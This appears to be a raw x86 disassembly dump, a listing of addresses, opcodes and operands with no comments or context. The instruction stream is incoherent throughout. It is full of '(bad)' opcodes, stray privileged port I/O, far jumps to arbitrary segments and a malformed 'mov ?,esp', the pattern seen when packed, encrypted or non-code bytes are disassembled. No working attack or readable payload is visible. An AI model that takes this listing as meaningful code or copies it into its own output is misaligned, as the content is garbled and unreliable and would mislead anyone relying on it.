  40ddef:	rol    ecx,0xaf
  40ddf2:	adc    BYTE PTR [ecx+0x4a],dh
  40ddf5:	ins    DWORD PTR es:[edi],dx
  40ddf6:	push   eax
  40ddf7:	bound  eax,QWORD PTR [esi+0x14]
  40ddfa:	fcmovnbe st,st(5)
  40ddfc:	ds mov ebx,0x2c5eca19
  40de02:	and    BYTE PTR [edi],0xd9
  40de05:	jmp    0x9729:0x218c30b6
  40de0c:	lds    esi,FWORD PTR [ebp+0x38795304]
  40de12:	call   0x9b6b4d36
  40de17:	jne    0x40de7a
  40de19:	call   0xd003:0xc1c5ebca
  40de20:	cmp    eax,0x13093391
  40de25:	adc    bh,BYTE PTR [edx]
  40de27:	dec    esi
  40de28:	sbb    ebp,DWORD PTR [ebx]
  40de2a:	test   eax,0x49e29c75
  40de2f:	icebp  
  40de30:	sbb    al,0x35
  40de32:	fcmovbe st,st(6)
  40de34:	add    al,0xc0
  40de36:	test   al,0xac
  40de38:	inc    ebx
  40de39:	out    dx,al
  40de3a:	mov    ah,bh
  40de3c:	aam    0x7e
  40de3e:	dec    edi
  40de3f:	inc    edx
  40de40:	add    eax,0x80067526
  40de45:	jmp    DWORD PTR [ebp+edx*4+0x46121499]
  40de4c:	repz inc edx
  40de4e:	xchg   edx,eax
  40de4f:	mov    eax,ds:0x8c1196cf
  40de54:	nop
  40de55:	add    BYTE PTR ss:[ebx],0xcd
  40de59:	mov    ss,WORD PTR [ebp-0x3b]
  40de5c:	pop    ebx
  40de5d:	fcomp  DWORD PTR [ecx-0x374b1ec0]
  40de63:	in     eax,dx
  40de64:	shl    DWORD PTR [ebx+0x4f],1
  40de67:	and    bh,cl
  40de69:	xchg   ecx,eax
  40de6a:	or     al,0xd3
  40de6c:	push   edi
  40de6d:	test   al,0xbd
  40de6f:	sbb    dh,BYTE PTR [eax+0x4a2f2ce8]
  40de75:	jge    0x40ded7
  40de77:	xchg   edi,eax
  40de78:	es dec edi
  40de7a:	push   esp
  40de7b:	mov    eax,0xa7357c24
  40de80:	out    dx,eax
  40de81:	cmp    eax,DWORD PTR [ebp-0x316221a]
  40de87:	jb     0x40de12
  40de89:	xchg   edx,eax
  40de8a:	pop    ebp
  40de8b:	out    dx,eax
  40de8c:	jno    0x40dec0
  40de8e:	inc    eax
  40de8f:	inc    eax
  40de90:	not    DWORD PTR [ecx+0x4f]
  40de93:	xchg   ebx,eax
  40de94:	fwait
  40de95:	push   ds
  40de96:	test   BYTE PTR [eax+0x77d18514],al
  40de9c:	xchg   esi,eax
  40de9d:	mov    dh,0x2b
  40de9f:	mov    ?,esp
  40dea1:	adc    al,BYTE PTR fs:[edx+0x7c]
  40dea5:	out    dx,eax
  40dea6:	gs xchg ch,ch
  40dea9:	dec    esi
  40deaa:	push   cs
  40deab:	lds    edi,FWORD PTR [edx-0xd44a706]
  40deb1:	popa   
  40deb2:	mov    ecx,0x7f44109e
  40deb7:	pop    es
  40deb8:	arpl   cx,bx
  40deba:	xor    eax,DWORD PTR [esi]
  40debc:	dec    esi
  40debd:	add    eax,0x936dc552
  40dec2:	add    edx,DWORD PTR [edi-0x2a]
  40dec5:	inc    eax
  40dec6:	adc    esi,eax
  40dec8:	ret    
  40dec9:	mov    ah,0x7c
  40decb:	call   0x62edad19
  40ded0:	(bad)  
  40ded1:	in     eax,0x35
  40ded3:	push   ds
  40ded4:	mov    dl,0x74
  40ded6:	push   0x9963e241
  40dedb:	pop    edi
  40dedc:	xchg   esi,eax
  40dedd:	lock addr16 je 0x40de8b
  40dee1:	adc    DWORD PTR [esi-0x6b],0x6d9d886a
  40dee8:	jmp    0xa9a12af1
  40deed:	add    BYTE PTR [ecx],al
  40deef:	push   edx
  40def0:	adc    DWORD PTR [eax-0x37],eax
  40def3:	movaps xmm1,XMMWORD PTR [edx]
  40def6:	(bad)  
  40def7:	addr16 push es
  40def9:	or     bl,cl
  40defb:	fsub   st(2),st
  40defd:	test   DWORD PTR [ebx],edx
  40deff:	xor    DWORD PTR [ebx-0x55966252],ebx
  40df05:	(bad)  
  40df06:	out    dx,eax
  40df07:	jo     0x40de89
  40df09:	(bad)  
  40df0a:	fdiv   DWORD PTR [ebx]
  40df0c:	cli    
  40df0d:	int3   
  40df0e:	inc    esi
  40df0f:	and    BYTE PTR [ebx+edi*8-0x6333f83],bl
  40df16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df17:	sbb    ebx,esi
  40df19:	into   
  40df1a:	jle    0x40deee
  40df1c:	scas   al,BYTE PTR es:[edi]
  40df1d:	push   esi
  40df1e:	daa    
  40df1f:	rcr    DWORD PTR [edx],1
  40df21:	or     DWORD PTR [ebp+0x18848154],esi
  40df27:	in     eax,0x7c
  40df29:	adc    edx,DWORD PTR [edx]
  40df2b:	and    BYTE PTR [edi-0x69b4a311],dl
  40df31:	int    0x53
  40df33:	push   esi
  40df34:	je     0x40df0c
  40df36:	adc    eax,0xec99b09d
  40df3b:	and    eax,0x431581
  40df40:	in     al,0xb3
  40df42:	jle    0x40dfa8
  40df44:	int    0x41
  40df46:	fsub   QWORD PTR [ecx+0x505c7266]
  40df4c:	ret    
  40df4d:	inc    esp
  40df4e:	repz js 0x40df8f
  40df51:	ja     0x40dfc6
  40df53:	sub    BYTE PTR [ebx+0x33],0x62
  40df57:	pop    eax
  40df58:	xchg   ecx,eax
  40df59:	popf   
  40df5a:	lea    edi,[ecx+0x638318e]
  40df60:	bound  eax,QWORD PTR [eax]
  40df62:	hlt    
  40df63:	scas   eax,DWORD PTR es:[edi]
  40df64:	fnstcw WORD PTR [edi+esi*8-0x20]
  40df68:	inc    esp
  40df69:	mov    eax,0xdfcb61ee
  40df6e:	mov    BYTE PTR [edi+0x61],bl
  40df71:	push   esi
  40df72:	jmp    0x40dfe4
  40df74:	mov    DWORD PTR [esi+ebx*1-0x52],edx
  40df78:	iret   
  40df79:	imul   ecx,DWORD PTR [edi],0xbd4b7e71
  40df7f:	shr    BYTE PTR cs:[esi-0x1fb49130],cl
  40df86:	inc    edx
  40df87:	add    BYTE PTR [edi+ecx*1+0x1b],bl
  40df8b:	pop    ds
  40df8c:	or     BYTE PTR [esi],0xaf
  40df8f:	aaa    
  40df90:	clc    
  40df91:	cld    
  40df92:	xchg   esi,eax
  40df93:	adc    edx,DWORD PTR [eax+0x24eeaa7a]
  40df99:	scas   eax,DWORD PTR es:[edi]
  40df9a:	inc    ecx
  40df9b:	mov    al,0xfd
  40df9d:	aam    0x7d
  40df9f:	push   es
  40dfa0:	pop    ds
  40dfa1:	retf   
  40dfa2:	fwait
  40dfa3:	sbb    DWORD PTR [esi-0x45],ecx
  40dfa6:	or     DWORD PTR [ebx+0x25],ebp
  40dfa9:	or     ebx,DWORD PTR [ebx+edi*2]
  40dfac:	sahf   
  40dfad:	jbe    0x40df61
  40dfaf:	lods   eax,DWORD PTR ds:[esi]
  40dfb0:	dec    edi
  40dfb1:	pop    ebx
  40dfb2:	lods   eax,DWORD PTR ds:[esi]
  40dfb3:	rcr    BYTE PTR [edi-0x1d],1
  40dfb6:	hlt    
  40dfb7:	mov    cl,0xde
  40dfb9:	mul    cl
  40dfbb:	daa    
  40dfbc:	adc    ebp,DWORD PTR [edi-0x70938099]
  40dfc2:	sub    DWORD PTR [eax-0x5],0x6
  40dfc6:	test   ebp,edx
  40dfc8:	adc    cl,BYTE PTR [edx-0x5e811f96]
  40dfce:	push   ss
  40dfcf:	push   ds
  40dfd0:	xor    BYTE PTR [edx+0x3bd512cd],bl
  40dfd6:	sub    BYTE PTR [edi],bl
  40dfd8:	cmp    al,0xd7
  40dfda:	xor    eax,ebx
  40dfdc:	out    dx,eax
  40dfdd:	loop   0x40dfe0
  40dfdf:	lods   al,BYTE PTR ds:[esi]
  40dfe0:	sti    
  40dfe1:	sbb    edi,DWORD PTR [esi]
  40dfe3:	out    0x90,eax
  40dfe5:	adc    al,ah
  40dfe7:	add    ah,BYTE PTR [edx]
  40dfe9:	xchg   edi,eax
  40dfea:	push   cs
  40dfeb:	mov    esi,0x4f755003
  40dff0:	sub    bl,BYTE PTR [ebx]
  40dff2:	jb     0x40dfab
  40dff4:	jno    0x40dff2
  40dff6:	ins    BYTE PTR es:[edi],dx
  40dff7:	ins    BYTE PTR es:[edi],dx
  40dff8:	aaa    
  40dff9:	(bad)  [eax+0x64]
  40dffc:	xor    eax,0xa1eda37a
  40e001:	test   BYTE PTR [edi-0x7ee7ca97],0x5f
  40e008:	and    esp,DWORD PTR [edi+0x233c98ff]
  40e00e:	inc    esp
  40e00f:	ret    
  40e010:	lock outs dx,BYTE PTR ds:[esi]
  40e012:	std    
  40e013:	popa   
  40e014:	or     DWORD PTR [esi-0x38],ebx
  40e017:	lods   al,BYTE PTR ds:[esi]
  40e018:	push   es
  40e019:	and    esp,DWORD PTR [ebx+ebp*1]
  40e01c:	in     eax,dx
  40e01d:	and    BYTE PTR [edx],0xb0
  40e020:	(bad)  
  40e022:	push   ebp
  40e023:	push   edi
  40e024:	dec    ebp
  40e025:	ss lock dec esp
  40e028:	xchg   esp,ebx
  40e02a:	push   0xa02ae956
  40e02f:	sar    BYTE PTR [esi],cl
  40e031:	cmp    DWORD PTR [ebp+0x1f],0x8910e4cc
  40e038:	repz hlt 
  40e03a:	jns    0x40dfee
  40e03c:	xchg   edx,eax
  40e03d:	ror    ebx,cl
  40e03f:	or     eax,0x3800684a
  40e044:	mov    bl,0x5
  40e046:	hlt    
  40e047:	or     BYTE PTR [ebx+0x268cc1cb],bl
  40e04d:	shl    DWORD PTR [ebp-0x47085f22],1
  40e053:	xchg   ebp,eax
  40e054:	mov    al,0xb9
  40e056:	dec    edx
  40e057:	addr16 pop ss
  40e059:	adc    dh,bh
  40e05b:	jmp    0x40e0a0
  40e05d:	lds    edi,FWORD PTR [ebx+0x30]
  40e060:	les    edx,FWORD PTR [edi]
  40e062:	arpl   di,si
  40e064:	and    edi,DWORD PTR [ecx+0x281c83a0]
  40e06a:	rol    BYTE PTR [ebp+0x17f2e559],0x23
  40e071:	jecxz  0x40e052
  40e073:	ss data16 js 0x40e0be
  40e077:	or     cl,BYTE PTR [edx-0x6]
  40e07a:	add    eax,DWORD PTR [ebx+0x4deb9683]
  40e080:	ffreep st(6)
  40e082:	cmp    ebp,DWORD PTR [ebp-0x6985e1b]
  40e088:	xchg   ebx,eax
  40e089:	pushf  
  40e08a:	lock mov ds:0x25c5c6e6,eax
  40e090:	or     eax,0x79caf543
  40e095:	ret    0xd5d8
  40e098:	or     al,0xf0
  40e09a:	jmp    0xa219:0x60ab594b
  40e0a1:	sub    eax,DWORD PTR [ecx-0x17ffd37a]
  40e0a7:	out    0xaf,eax
  40e0a9:	or     ebp,DWORD PTR [ecx]
  40e0ab:	in     eax,dx
  40e0ac:	fs in  eax,0xeb
  40e0af:	aas    
  40e0b0:	xlat   BYTE PTR ds:[ebx]
  40e0b1:	and    DWORD PTR [ebx],ecx
  40e0b3:	add    ebp,DWORD PTR [esi-0x737ff937]
  40e0b9:	inc    esi
  40e0ba:	inc    esp
  40e0bb:	jmp    0x40e0a1
  40e0bd:	xor    DWORD PTR [ecx-0x42],ecx
  40e0c0:	and    edx,eax
  40e0c2:	or     BYTE PTR [eax-0x5d2c7416],0x44
  40e0c9:	cs mov ah,0x5e
  40e0cc:	pop    esi
  40e0cd:	loopne 0x40e080
  40e0cf:	js     0x40e070
  40e0d1:	ss adc al,0x1c
  40e0d4:	or     ebx,ebx
  40e0d6:	es sbb ebx,edi
  40e0d9:	cmp    dl,BYTE PTR [ecx+ebp*4+0x161332e0]
  40e0e0:	into   
  40e0e1:	sahf   
  40e0e2:	fisub  WORD PTR [esi-0x770090c1]
  40e0e8:	mov    ds:0xa2b4536e,eax
  40e0ed:	cwde   
  40e0ee:	cmp    esi,DWORD PTR [ecx+0x67]
  40e0f1:	fsub   st(5),st
  40e0f3:	jb     0x40e0a2
  40e0f5:	repnz test DWORD PTR [esi+0x22f2ce8c],edx
  40e0fc:	sbb    DWORD PTR [esi],0xfffffff2
  40e0ff:	jnp    0x40e0d5
  40e101:	push   0x523464a0
  40e106:	ror    BYTE PTR [edi-0x44],1
  40e109:	dec    ebp
  40e10a:	pop    edx
  40e10b:	mov    al,ds:0x49c02c15
  40e110:	xchg   DWORD PTR [eax+0x6b],eax
  40e113:	lea    eax,[edi+0x32]
  40e116:	int3   
  40e117:	stos   DWORD PTR es:[edi],eax
  40e118:	(bad)  
  40e119:	jmp    0x9386:0xf93d816
  40e120:	mov    eax,ds:0xdf4731ef
  40e125:	xlat   BYTE PTR ds:[ebx]
  40e126:	ds je  0x40e0c0
  40e129:	ffreep st(7)
  40e12b:	out    dx,eax
  40e12c:	pop    ecx
  40e12d:	test   al,0x23
  40e12f:	cmp    bl,dh
  40e131:	mov    ds,WORD PTR [ecx]
  40e133:	xor    edx,DWORD PTR [ebx+eiz*2-0x4ff96f37]
  40e13a:	mov    DWORD PTR [edx],0x80aedfbf
  40e140:	icebp  
  40e141:	push   ds
  40e142:	dec    esi
  40e143:	inc    edi
  40e144:	mov    ds:0x2a05d3bf,eax
  40e149:	xor    DWORD PTR ds:0x71040cdf,eax
  40e14f:	xchg   ecx,eax
  40e150:	nop
  40e151:	lock mov al,0x67
  40e154:	cmp    eax,0x45c29405
  40e159:	xchg   DWORD PTR [ecx-0x7f],ebx
  40e15c:	xchg   DWORD PTR ds:0xebd0cc1a,ebp
  40e162:	dec    ebx
  40e163:	ret    0x53ee
  40e166:	pop    ecx
  40e167:	mov    esp,0xbba66657
  40e16c:	jnp    0x40e154
  40e16e:	fdivr  DWORD PTR [ecx+0x13f9910b]
  40e174:	enter  0x2f6c,0xea
  40e178:	jecxz  0x40e1c9
  40e17a:	mov    ah,0x32
  40e17c:	dec    ecx
  40e17d:	mov    ch,0x8
  40e17f:	mov    ds:0x3d8cff61,eax
  40e184:	outs   dx,BYTE PTR ds:[esi]
  40e185:	aas    
  40e186:	mov    ebp,0x618eb858
  40e18b:	fwait
  40e18c:	inc    ebx
  40e18d:	pop    ebp
  40e18e:	sub    edi,DWORD PTR [ebx+edx*8-0x39b1e19d]
  40e195:	loopne 0x40e1cd
  40e197:	aaa    
  40e198:	adc    DWORD PTR [edx-0x1e568961],edi
  40e19e:	addr16 icebp 
  40e1a0:	mov    eax,0x23f4b987
  40e1a5:	outs   dx,BYTE PTR ds:[esi]
  40e1a6:	push   edi
  40e1a7:	xchg   esi,eax
  40e1a8:	mov    ch,0x7c
  40e1aa:	dec    esi
  40e1ab:	rol    DWORD PTR [eax+ecx*2+0x7eb6e58a],0xfe
  40e1b3:	xchg   esi,eax
  40e1b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1b5:	call   0x4c501b54
  40e1ba:	mov    ebp,0x33862bc9
  40e1bf:	aas    
  40e1c0:	iret   
  40e1c1:	inc    eax
  40e1c2:	jl     0x40e1de
  40e1c4:	sbb    al,0x70
  40e1c6:	aas    
  40e1c7:	pop    edi
  40e1c8:	rol    eax,0x8
  40e1cb:	sbb    edi,0xfffffff0
  40e1ce:	out    dx,eax
  40e1cf:	xchg   edi,eax
  40e1d0:	sub    DWORD PTR [edi-0x18],esp
  40e1d3:	dec    ebp
  40e1d4:	jo     0x40e192
  40e1d6:	mov    ah,0x39
  40e1d8:	cmovb  edi,DWORD PTR [edx]
  40e1db:	mov    BYTE PTR [ebx+0x69a8ceda],cl
  40e1e1:	mov    al,ds:0x14e19866
  40e1e6:	jbe    0x40e1c2
  40e1e8:	int3   
  40e1e9:	out    0xfd,al
  40e1eb:	aas    
  40e1ec:	hlt    
  40e1ed:	fwait
  40e1ee:	or     ebx,DWORD PTR [esi]
  40e1f0:	jbe    0x40e1f2
  40e1f2:	inc    eax
  40e1f3:	sbb    edi,DWORD PTR [ebx-0x5a]
  40e1f6:	add    al,0xb0
  40e1f8:	jnp    0x40e1c6
  40e1fa:	mul    BYTE PTR [eax+esi*2+0x4]
  40e1fe:	mov    ebx,ebx
  40e200:	jg     0x40e1c9
  40e202:	jae    0x40e217
  40e204:	cmp    BYTE PTR [esi+esi*8],0x11
  40e208:	mov    ebx,0x7ac80e8
  40e20d:	xor    DWORD PTR [eax],ecx
  40e20f:	xchg   ebx,eax
  40e210:	out    dx,eax
  40e211:	adc    ebp,esp
  40e213:	sahf   
  40e214:	and    dl,bh
  40e216:	ffree  st(4)
  40e218:	daa    
  40e219:	ror    BYTE PTR [ecx],cl
  40e21b:	cld    
  40e21c:	punpckhbw mm1,QWORD PTR [ecx+ebx*2]
  40e220:	xor    DWORD PTR [edi-0x1d],eax
  40e223:	inc    edx
  40e224:	adc    al,0x72
  40e226:	aaa    
  40e227:	push   0x71f0e4c3
  40e22c:	pop    esi
  40e22d:	mov    ch,0x57
  40e22f:	out    0x90,al
  40e231:	les    ebx,FWORD PTR [eax]
  40e233:	cmp    ah,al
  40e235:	das    
  40e236:	aad    0xcd
  40e238:	add    BYTE PTR [edx+0x1fae37d2],cl
  40e23e:	and    al,0x4
  40e240:	sub    al,0x43
  40e242:	(bad)  
  40e243:	pop    ebx
  40e244:	out    0xf1,al
  40e246:	push   cs
  40e247:	das    
  40e248:	gs add al,0xe1
  40e24b:	hlt    
  40e24c:	ins    DWORD PTR es:[edi],dx
  40e24d:	retf   0xe56c
  40e250:	cmp    DWORD PTR [edi+edi*2+0x383d87de],esi
  40e257:	sbb    eax,DWORD PTR [eax]
  40e259:	push   es
  40e25a:	sbb    eax,DWORD PTR [esi-0x1e]
  40e25d:	cmc    
  40e25e:	fwait
  40e25f:	push   0x5938a05f
  40e264:	fdiv   QWORD PTR [ebx]
  40e266:	pop    eax
  40e267:	pop    ds
  40e268:	popf   
  40e269:	daa    
  40e26a:	not    DWORD PTR [ebp+0x3fa637b9]
  40e270:	pop    ss
  40e271:	mov    edx,0x9141e68f
  40e276:	std    
  40e277:	adc    al,0x10
  40e279:	or     eax,0x28a1d978
  40e27e:	in     al,dx
  40e27f:	popa   
  40e280:	pop    ebx
  40e281:	aad    0x36
  40e283:	cmp    eax,0x140ca022
  40e288:	bound  edx,QWORD PTR [edi-0x7adcd15b]
  40e28e:	push   ss
  40e28f:	mov    edi,0x26bb152b
  40e294:	pushf  
  40e295:	outs   dx,DWORD PTR ds:[esi]
  40e296:	push   ecx
  40e297:	sbb    BYTE PTR [ebp-0x3c989ee9],ah
  40e29d:	sbb    ebx,esi
  40e29f:	mov    ah,0x74
  40e2a1:	ds jne 0x40e31a
  40e2a4:	mov    ch,0x80
  40e2a6:	dec    ecx
  40e2a7:	repnz (bad) 
  40e2a9:	retf   
  40e2aa:	cmc    
  40e2ab:	push   0xffffffaf
  40e2ad:	jmp    0x260ee4bd
  40e2b2:	enter  0x1566,0x8b
  40e2b6:	mov    DWORD PTR [ecx+0x5],ebx
  40e2b9:	pop    esp
  40e2ba:	inc    ecx
  40e2bb:	inc    esi
  40e2bc:	inc    ebp
  40e2bd:	(bad)  
  40e2be:	xchg   ecx,eax
  40e2bf:	xchg   ecx,eax
  40e2c0:	shl    BYTE PTR [esi+0x56],cl
  40e2c3:	xchg   ah,bh
  40e2c5:	ins    DWORD PTR es:[edi],dx
  40e2c6:	add    dl,ch
  40e2c8:	ins    DWORD PTR es:[edi],dx
  40e2c9:	mov    BYTE PTR [ebx],dh
  40e2cb:	push   esp
  40e2cc:	test   eax,0x177b254b
  40e2d1:	xchg   BYTE PTR [edi],bh
  40e2d3:	imul   esi,DWORD PTR [ebp-0x680a01cf],0x72
  40e2da:	mov    WORD PTR [ebp+eiz*8-0x52],es
  40e2de:	test   BYTE PTR [ebx+0x4a],cl
  40e2e1:	das    
  40e2e2:	mov    esi,0x343f96a5
  40e2e7:	loopne 0x40e284
  40e2e9:	mov    eax,0xb3acbe09
  40e2ee:	(bad)  
  40e2f0:	test   eax,0x9770e596
  40e2f5:	mov    dl,0xca
  40e2f7:	stc    
  40e2f8:	(bad)  
  40e2f9:	pop    ds
  40e2fa:	in     eax,dx
  40e2fb:	rcr    DWORD PTR ds:0x5413031b,cl
  40e301:	pop    edi
  40e302:	adc    cl,bh
  40e304:	jne    0x40e2c2
  40e306:	test   al,0x98
  40e308:	or     cl,bl
  40e30a:	mov    ds:0x29abfd4a,al
  40e30f:	inc    edx
  40e310:	cwde   
  40e311:	pop    edi
  40e312:	ret    0x8dc5
  40e315:	pop    edi
  40e316:	adc    esi,ebp
  40e318:	xlat   BYTE PTR ds:[ebx]
  40e319:	icebp  
  40e31a:	ret    
  40e31b:	loope  0x40e320
  40e31d:	cmp    al,0x4b
  40e31f:	inc    edi
  40e320:	sbb    eax,0x9736d67
  40e325:	loopne 0x40e352
  40e327:	dec    esp
  40e328:	or     BYTE PTR [esi+0x537cc801],al
  40e32e:	mov    eax,ds:0xa6021060
  40e333:	iret   
  40e334:	dec    ebp
  40e335:	loope  0x40e307
  40e337:	mov    bl,BYTE PTR [edx+0x7c]
  40e33a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e33b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e33c:	pop    edx
  40e33d:	sub    BYTE PTR [ebx+0x44377a99],dh
  40e343:	sti    
  40e344:	jnp    0x40e2f9
  40e346:	inc    esi
  40e347:	inc    edi
  40e348:	jg     0x40e301
  40e34a:	adc    eax,0x5d
  40e34d:	stos   BYTE PTR es:[edi],al
  40e34e:	mov    ebx,0xcd7b3500
  40e353:	imul   ebp,DWORD PTR [eax+edi*1],0x251c251d
  40e35a:	mov    eax,0xf35e5d93
  40e35f:	jge    0x40e34b
  40e361:	sbb    DWORD PTR [ecx],edi
  40e363:	sub    bl,BYTE PTR [edx-0x2545a5]
  40e369:	cmp    DWORD PTR [edx+0x20972c95],ecx
  40e36f:	push   0xeeae9834
  40e374:	jl     0x40e306
  40e376:	inc    edi
  40e377:	xchg   ebp,eax
  40e378:	push   edi
  40e379:	icebp  
  40e37a:	mov    ch,0x93
  40e37c:	pop    ds
  40e37d:	ficom  DWORD PTR [ecx+0x1cd7dc71]
  40e383:	cli    
  40e384:	xchg   ecx,eax
  40e385:	xchg   ebp,eax
  40e386:	adc    edx,DWORD PTR [esi+0x74db7cf3]
  40e38c:	bound  ebx,QWORD PTR [esi-0x63ea384c]
  40e392:	push   es
  40e393:	lahf   
  40e394:	stos   DWORD PTR es:[edi],eax
  40e395:	loopne 0x40e333
  40e397:	inc    edi
  40e398:	or     BYTE PTR [edx-0x10fe1e13],0x18
  40e39f:	pop    eax
  40e3a0:	jnp    0x40e3da
  40e3a2:	sbb    esi,ecx
  40e3a4:	daa    
  40e3a5:	ror    BYTE PTR [ebx-0x2a],1
  40e3a8:	pop    edi
  40e3a9:	jno    0x40e3ba
  40e3ab:	stc    
  40e3ac:	cwde   
  40e3ad:	rol    BYTE PTR [eax-0x258b3198],0xfb
  40e3b4:	mul    DWORD PTR [edx-0x39]
  40e3b7:	hlt    
  40e3b8:	retf   0x328c
  40e3bb:	push   0xe0e6b008
  40e3c0:	jmp    0x23029e8a
  40e3c5:	sti    
  40e3c6:	fwait
  40e3c7:	xchg   edx,eax
  40e3c8:	xchg   ebp,eax
  40e3c9:	or     DWORD PTR [edx],esp
  40e3cb:	test   DWORD PTR [ebp+0x6f1e19d7],edx
  40e3d1:	xrelease mov DWORD PTR [ecx+0x2],edx
  40e3d5:	ret    0x1588
  40e3d8:	push   edx
  40e3d9:	xchg   DWORD PTR [ebp+0x2c],edi
  40e3dc:	xchg   DWORD PTR [ebp-0x5c],ebx
  40e3df:	ret    
  40e3e0:	sti    
  40e3e1:	ins    BYTE PTR es:[edi],dx
  40e3e2:	cld    
  40e3e3:	xor    bl,BYTE PTR [edi+0x7fce9c16]
  40e3e9:	push   edi
  40e3ea:	jne    0x40e455
  40e3ec:	cld    
  40e3ed:	lahf   
  40e3ee:	in     al,dx
  40e3ef:	shl    DWORD PTR fs:[eax+0x50],cl
  40e3f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3f4:	add    BYTE PTR [ebx+0x1c],0x6
  40e3f8:	inc    ecx
  40e3f9:	dec    DWORD PTR [esi]
  40e3fb:	rol    BYTE PTR [ecx+0xff2abda],0xdd
  40e402:	dec    ebx
  40e403:	add    dl,BYTE PTR [ebx-0x69]
  40e406:	in     eax,dx
  40e407:	dec    ebp
  40e408:	push   esi
  40e409:	jmp    0xd2a0:0xa7220149
  40e410:	or     esi,DWORD PTR [edi-0x4]
  40e413:	rcl    DWORD PTR [ecx-0x63],1
  40e416:	or     al,0x8
  40e418:	xchg   edi,eax
  40e419:	xlat   BYTE PTR ds:[ebx]
  40e41a:	in     eax,dx
  40e41b:	repz pop ebp
  40e41d:	leave  
  40e41e:	daa    
  40e41f:	scas   al,BYTE PTR es:[edi]
  40e420:	push   ds
  40e421:	mov    ebx,0x5c290dc9
  40e426:	lahf   
  40e427:	fldl2e 
  40e429:	mov    ebx,0xe4da5fc3
  40e42e:	push   eax
  40e42f:	mov    edx,0x79ea57c2
  40e434:	out    dx,al
  40e435:	outs   dx,BYTE PTR ds:[esi]
  40e436:	jae    0x40e3e8
  40e438:	xor    eax,0x450d1d5c
  40e43d:	sahf   
  40e43e:	jae    0x40e473
  40e440:	inc    esp
  40e441:	ret    0x7876
  40e444:	push   eax
  40e445:	call   0xa0c1:0x304f586e
  40e44c:	jbe    0x40e44c
  40e44e:	add    al,0x6d
  40e450:	mov    al,ds:0xed88f95e
  40e455:	pop    esp
  40e456:	fisttp DWORD PTR es:[esi]
  40e459:	repnz inc ecx
  40e45b:	adc    BYTE PTR [ebp-0x540b5b30],0xd0
  40e462:	mov    ss,WORD PTR [ebx]
  40e464:	push   ss
  40e465:	loopne 0x40e3f8
  40e467:	popa   
  40e468:	jbe    0x40e3ec
  40e46a:	mov    al,ds:0xdda7e74a
  40e46f:	and    al,0xea
  40e471:	into   
  40e472:	dec    ebx
  40e473:	jmp    0x2789375d
  40e478:	cdq    
  40e479:	xor    BYTE PTR [ecx],cl
  40e47b:	jmp    0x747b9fb8
  40e480:	mov    eax,0xfbd0452a
  40e485:	jae    0x40e407
  40e487:	cmp    al,dh
  40e489:	fs sbb al,0x8d
  40e48c:	mov    fs,WORD PTR [ecx]
  40e48e:	or     dl,ah
  40e490:	dec    ecx
  40e491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e492:	push   esi
  40e493:	data16 ja 0x40e47c
  40e496:	mov    ds:0x2021e4,al
	...
  40e513:	add    BYTE PTR [ebx+0x6d],bl
  40e516:	add    esi,DWORD PTR ds:0x6f7f7f37
  40e51c:	pop    eax
  40e51d:	je     0x40e4cc
  40e51f:	sar    ah,1
  40e521:	and    DWORD PTR [eax],edi
  40e523:	scas   eax,DWORD PTR es:[edi]
  40e524:	leave  
  40e525:	xchg   edx,eax
  40e526:	add    BYTE PTR [eax],al
  40e528:	outs   dx,BYTE PTR ds:[esi]
  40e529:	pop    es
  40e52a:	add    BYTE PTR [eax],al
  40e52c:	and    DWORD PTR [ebx],eax
  40e52e:	inc    esi
  40e52f:	sub    ah,bl
  40e531:	mov    ds:0xfab1ff0c,al
  40e536:	sub    eax,0x74a4df
  40e53b:	fld    TBYTE PTR [ebp+0x70f49f39]
  40e541:	ret    0x88a1
  40e544:	and    BYTE PTR [esi+0x60],dl
  40e547:	aaa    
  40e548:	jle    0x40e4df
  40e54a:	xor    al,BYTE PTR [ecx]
  40e54c:	cmc    
  40e54d:	aaa    
  40e54e:	cmovb  eax,DWORD PTR [ecx-0x6812eb84]
  40e555:	into   
  40e556:	xchg   edx,eax
  40e557:	ret    0xbec6
  40e55a:	xor    dh,BYTE PTR [edx-0x69]
  40e55d:	jg     0x40e594
  40e55f:	jo     0x40e555
  40e561:	loopne 0x40e4f7
  40e563:	js     0x40e57c
  40e565:	repz push cs
  40e567:	xchg   esp,eax
  40e568:	jecxz  0x40e5e4
  40e56a:	pop    edi
  40e56b:	lahf   
  40e56c:	repnz int 0x79
  40e56f:	adc    al,0xac
  40e571:	popa   
  40e572:	sub    al,0x15
  40e574:	pop    ebp
  40e575:	xchg   esp,eax
  40e576:	xor    eax,0xc922fe12
  40e57b:	inc    edi
  40e57c:	mov    dh,0xff
  40e57e:	mov    BYTE PTR [edx-0x3f],bl
  40e581:	xchg   ah,al
  40e583:	idiv   BYTE PTR [esi+0x31]
  40e586:	clc    
  40e587:	and    BYTE PTR [ebp-0x31],dh
  40e58a:	(bad)  
  40e58b:	sub    DWORD PTR [edx-0x32],esi
  40e58e:	out    0xe6,al
  40e590:	jns    0x40e5e7
  40e592:	mov    bl,0x4e
  40e594:	int    0x82
  40e596:	sbb    DWORD PTR [ebx-0x66bc1037],ebx
  40e59c:	das    
  40e59d:	jecxz  0x40e58b
  40e59f:	outs   dx,DWORD PTR ds:[esi]
  40e5a0:	repz cmp al,0x9
  40e5a3:	xor    al,0x12
  40e5a5:	es pop ebx
  40e5a7:	sbb    DWORD PTR [eax],ebx
  40e5a9:	mov    dl,0xfc
  40e5ab:	dec    esi
  40e5ac:	push   0x1b
  40e5ae:	fstp   QWORD PTR ds:0xe1795520
  40e5b4:	dec    esp
  40e5b5:	pusha  
  40e5b6:	sbb    bh,cl
  40e5b8:	inc    ebp
  40e5b9:	stc    
  40e5ba:	add    dl,BYTE PTR [ecx+esi*4]
  40e5bd:	std    
  40e5be:	cld    
  40e5bf:	adc    BYTE PTR [eax+0x1ff19c08],dl
  40e5c5:	inc    esp
  40e5c6:	aas    
  40e5c7:	inc    ebx
  40e5c8:	and    al,0x34
  40e5ca:	(bad)  
  40e5cb:	pop    ecx
  40e5cc:	shl    ebx,0xd2
  40e5cf:	lods   eax,DWORD PTR ds:[esi]
  40e5d0:	and    eax,edx
  40e5d2:	dec    edi
  40e5d3:	pop    ecx
